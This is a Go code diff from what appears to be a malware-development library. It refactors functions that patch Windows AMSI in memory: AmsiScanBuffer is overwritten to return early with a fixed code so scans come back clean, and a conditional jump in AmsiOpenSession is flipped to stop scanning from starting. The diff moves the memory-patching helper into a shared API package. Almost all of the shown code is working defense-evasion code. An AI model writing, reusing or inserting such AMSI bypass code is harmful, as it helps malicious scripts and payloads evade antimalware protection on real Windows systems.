@@ -15,26 +15,8 @@ import (
 	"fmt"
 	"unsafe"
 
-	"golang.org/x/sys/windows"
+	"github.com/oioio-space/maldev/win/api"
 )
-
-// patchMemory changes memory protection, writes patch bytes, restores protection.
-func patchMemory(addr uintptr, patch []byte) error {
-	var oldProtect uint32
-	size := uintptr(len(patch))
-	err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
-	if err != nil {
-		return fmt.Errorf("VirtualProtect RWX: %w", err)
-	}
-	for i, b := range patch {
-		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
-	}
-	err = windows.VirtualProtect(addr, size, oldProtect, &oldProtect)
-	if err != nil {
-		return fmt.Errorf("VirtualProtect restore: %w", err)
-	}
-	return nil
-}
 
 // PatchScanBuffer patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
 // The patch overwrites the function entry with: mov eax, 0x80070057; ret
@@ -42,14 +24,13 @@ func patchMemory(addr uintptr, patch []byte) error {
 //
 // Returns nil if amsi.dll is not loaded (nothing to patch).
 func PatchScanBuffer() error {
-	amsi := windows.NewLazySystemDLL("amsi.dll")
-	proc := amsi.NewProc("AmsiScanBuffer")
+	proc := api.Amsi.NewProc("AmsiScanBuffer")
 	if err := proc.Find(); err != nil {
 		return nil // AMSI not loaded
 	}
 	// mov eax, 0x80070057; ret
 	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
-	return patchMemory(proc.Addr(), patch)
+	return api.PatchMemory(proc.Addr(), patch)
 }
 
 // PatchOpenSession patches AmsiOpenSession to prevent AMSI initialization.
@@ -58,8 +39,7 @@ func PatchScanBuffer() error {
 //
 // Returns nil if amsi.dll is not loaded.
 func PatchOpenSession() error {
-	amsi := windows.NewLazySystemDLL("amsi.dll")
-	proc := amsi.NewProc("AmsiOpenSession")
+	proc := api.Amsi.NewProc("AmsiOpenSession")
 	if err := proc.Find(); err != nil {
 		return nil // AMSI not loaded
 	}
@@ -67,7 +47,7 @@ func PatchOpenSession() error {
 	for i := uintptr(0); i < 1024; i++ {
 		b := *(*byte)(unsafe.Pointer(addr + i))
 		if b == 0x74 { // JZ
-			return patchMemory(addr+i, []byte{0x75}) // JNZ
+			return api.PatchMemory(addr+i, []byte{0x75}) // JNZ
 		}
 	}
 	return fmt.Errorf("AmsiOpenSession: conditional jump (0x74) not found in first 1024 bytes")
